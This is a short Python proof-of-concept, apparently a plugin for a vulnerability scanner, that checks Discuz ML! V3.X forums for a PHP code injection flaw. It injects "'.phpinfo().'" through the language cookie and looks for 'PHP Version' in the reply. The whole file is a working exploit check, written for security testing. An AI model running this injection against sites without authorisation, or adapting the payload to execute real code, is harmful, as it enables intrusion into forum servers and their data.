#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Copyright (c) saucerman (https://saucer-man.com)
See the file 'LICENSE' for copying permission
"""
"""
Discuz ML! V3.X 代码注入 https://www.anquanke.com/post/id/181887
"""
from plugin.target_parse import get_standard_url
from lib.core.Request import request
import re


def poc(url):
    url = get_standard_url(url)
    url = url + "/forum.php"
    try:
        r = request.get(url, timeout=5)
        tmp = re.split(" |=|,", r.headers['Set-Cookie'])
        field = [i for i in tmp if "language" in i]
        if not field:
            return False
        # print(f"{url}:{field}")
        cookie = {
            field[0]: "'.phpinfo().'"
        }
        r = request.get(url, cookies=cookie, timeout=5)
        if "PHP Version" in r.text:
            return True
    except:
        return False